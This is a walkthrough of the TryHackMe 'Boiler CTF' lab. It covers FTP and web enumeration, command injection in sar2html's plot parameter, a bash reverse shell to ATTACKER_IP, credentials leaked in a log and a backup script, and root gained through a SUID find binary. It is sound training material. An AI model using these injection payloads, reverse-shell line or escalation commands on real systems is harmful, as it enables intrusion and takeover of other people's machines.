# Boiler CTF

Intermediate level CTF. Just enumerate, you'll get there.

Room: https://tryhackme.com/room/boilerctf2

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/boilerctf2.md

---

## Summary

The intended attack path was:

```text
Nmap enumeration
Anonymous FTP
Hidden ROT13 clue
Web directory enumeration
Joomla discovery
Hidden sar2html instance
Exposed log.txt
SSH as basterd
Credential disclosure in backup.sh
Switch to stoner
SUID find privilege escalation
Root
```

The sar2html application was also vulnerable to command injection. This provided an alternative route to inspect the server as `www-data`, although a reverse shell was not required to complete the room.

---

## Nmap

I started with a full TCP scan and default service scripts:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt TARGET_IP
```

The scan found four open ports:

```text
21/tcp     FTP
80/tcp     HTTP
10000/tcp  Webmin
55007/tcp  SSH
```

Relevant service information:

```text
21/tcp     vsftpd 3.0.3
80/tcp     Apache 2.4.18
10000/tcp  MiniServ 1.930
55007/tcp  OpenSSH 7.2p2
```

The highest open port was running SSH.

Anonymous FTP access was also enabled.

---

## Anonymous FTP

I connected to FTP using the anonymous account:

```bash
ftp TARGET_IP
```

Credentials:

```text
Username: anonymous
Password: anonymous
```

A normal directory listing appeared empty:

```text
ftp> ls
```

Listing hidden files revealed:

```text
.info.txt
```

I downloaded it:

```text
ftp> get .info.txt
```

The file contained:

```text
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

This was ROT13.

Decoding it produced:

```text
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

The clue confirmed that deeper enumeration was required.

---

## Web Enumeration

Port 80 initially displayed the default Apache page.

I checked `robots.txt`:

```bash
curl http://TARGET_IP/robots.txt
```

It contained:

```text
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it
```

The paths formed the phrase:

```text
yellow not a rabbit hole or is it
```

The page also contained decimal ASCII values:

```text
079 084 108 105 ...
```

Converting the values to ASCII produced Base64:

```text
OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
```

Decoding that produced:

```text
99b0660cd95adea327c54182baa51584
```

This appeared to be another clue or distraction rather than the direct attack path.

---

## Joomla Discovery

Directory enumeration identified a Joomla installation:

```text
http://TARGET_IP/joomla/
```

I enumerated it using Gobuster:

```bash
gobuster dir \
  -u http://TARGET_IP/joomla \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak,zip \
  -t 50 \
  -o gobuster-common-ext.txt
```

Several unusual directories were discovered:

```text
/_archive/
/_database/
/_files/
/_test/
/~www/
/administrator/
/installation/
```

The standard Joomla directories were also present.

---

## Decoy Directories

Several of the unusual directories contained encoded joke messages.

### `_database`

The response contained:

```text
Lwuv oguukpi ctqwpf.
```

This was a Caesar cipher shifted by two characters.

Decoded:

```text
Just messing around.
```

### `_files`

The response contained:

```text
VjJodmNITnBaU0JrWVdsemVRbz0K
```

Decoding Base64 twice produced:

```text
Whopsie daisy
```

### `_archive` and `~www`

These contained:

```text
Mnope, nothin to see.
```

Most of these directories were deliberate distractions.

---

## Hidden sar2html Application

The interesting directory was:

```text
http://TARGET_IP/joomla/_test/
```

It hosted an application called:

```text
sar2html
```

There were two possible ways forward from here.

---

# Path One: Directly Accessing log.txt

This was the cleaner and likely intended route.

Further file enumeration of the sar2html directory could reveal the exposed log file:

```bash
gobuster dir \
  -u http://TARGET_IP/joomla/_test/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,log,bak,php \
  -t 50
```

The important result was:

```text
/log.txt
```

It was directly accessible over HTTP:

```bash
curl http://TARGET_IP/joomla/_test/log.txt
```

The response contained an SSH authentication log:

```text
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@**
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
...
```

The log disclosed:

```text
Username: basterd
Password: superduperp@**
```

The username mentioned in the accepted-password line was the correct account despite another line referring to `pentest`.

This path did not require command execution or a reverse shell.

---

# Path Two: sar2html Command Injection

The sar2html application was also vulnerable to command injection through its `plot` parameter.

I tested it using:

```bash
curl -sG \
  --data-urlencode 'plot=;id' \
  'http://TARGET_IP/joomla/_test/index.php'
```

The command output appeared inside the Host dropdown:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A second test confirmed the execution context:

```bash
curl -sG \
  --data-urlencode 'plot=;whoami' \
  'http://TARGET_IP/joomla/_test/index.php'
```

Output:

```text
www-data
```

This provided command execution as the Apache user.

### Optional reverse shell

I started a listener:

```bash
nc -lvnp 4444
```

Then triggered a Bash reverse shell:

```bash
curl -sG \
  --data-urlencode "plot=;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
  'http://TARGET_IP/joomla/_test/index.php'
```

The listener received:

```text
www-data@Vulnerable:/var/www/html/joomla/_test$
```

From the shell, the same file could be found and read:

```bash
find /var/www/html/joomla -type f -name '???.???' 2>/dev/null
```

The relevant result was:

```text
/var/www/html/joomla/_test/log.txt
```

Reading it:

```bash
cat /var/www/html/joomla/_test/log.txt
```

revealed the same SSH credentials.

The reverse shell was valid, but unnecessary because `log.txt` was already exposed through the web server.

---

## SSH as basterd

SSH was running on the non-standard port `55007`.

Using the credentials leaked in `log.txt`:

```bash
ssh -p 55007 basterd@TARGET_IP
```

After logging in, the home directory contained:

```text
backup.sh
```

---

## Credential Disclosure in backup.sh

I inspected the script:

```bash
cat backup.sh
```

The script contained:

```bash
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@**no1knows
```

The comment disclosed credentials for the user:

```text
Username: stoner
Password: superduperp@**no1knows
```

I switched to the account:

```bash
su - stoner
```

---

## User Flag

There was no file named `user.txt`.

Listing hidden files in the user's home directory revealed:

```bash
ls -la /home/stoner
```

The interesting file was:

```text
.secret
```

Reading it:

```bash
cat /home/stoner/.secret
```

produced the user flag:

```text
You made it till here, well ****.
```

---

## Privilege Escalation Enumeration

I checked sudo permissions:

```bash
sudo -l
```

The result included:

```text
(root) NOPASSWD: /NotThisTime/MessinWithYa
```

The path did not exist and could not be created:

```bash
mkdir -p /NotThisTime
```

Result:

```text
Permission denied
```

This appeared to be another decoy.

The user was also a member of the `lxd` group:

```bash
id
```

However, only the LXD client was installed:

```text
lxd-client installed
LXD daemon absent
lxd.service masked
lxd.socket masked
```

The LXD daemon was unavailable, so this was not a usable privilege-escalation route.

---

## SUID Enumeration

I searched for SUID binaries:

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

One result stood out:

```text
-r-sr-xr-x 1 root root ... /usr/bin/find
```

The `find` binary was owned by root and had the SUID bit set.

---

## Root Through SUID find

The `find` command supports executing another program through `-exec`.

Because the binary ran with root privileges, I launched a shell while preserving its effective UID:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Verification:

```bash
whoami
```

Output:

```text
root
```

---

## Root Flag

I moved into the root user's home directory:

```bash
cd /root
ls
```

The flag file was:

```text
root.txt
```

Reading it:

```bash
cat /root/root.txt
```

produced:

```text
It wasn't that hard, was **?
```

## Attack Paths

### Intended path

```text
Anonymous FTP
    ↓
Hidden .info.txt
    ↓
ROT13 enumeration clue
    ↓
Joomla discovery
    ↓
sar2html under /joomla/_test/
    ↓
Directly accessible log.txt
    ↓
SSH credentials for basterd
    ↓
backup.sh credentials
    ↓
Switch to stoner
    ↓
Hidden .secret user flag
    ↓
SUID /usr/bin/find
    ↓
Root
```

### Alternative path

```text
Anonymous FTP
    ↓
Joomla discovery
    ↓
sar2html command injection
    ↓
Optional reverse shell as www-data
    ↓
Read /joomla/_test/log.txt locally
    ↓
SSH credentials for basterd
    ↓
Continue through backup.sh and SUID find
```

---

## Key Lessons

* Always check anonymous FTP for hidden files.
* Continue enumerating inside discovered applications and directories.
* Exposed logs may contain credentials and can eliminate the need for exploitation.
* Verify whether files discovered locally are also directly accessible over HTTP.
* Command injection was valid here, but it was not necessary for completing the room.
* Logs and backup scripts frequently expose reusable credentials.
* Check hidden files when expected flag filenames are absent.
* Group membership is only useful if the associated service is installed and running.
* Always enumerate SUID binaries.
* SUID `find` can execute a privileged shell through `-exec`.
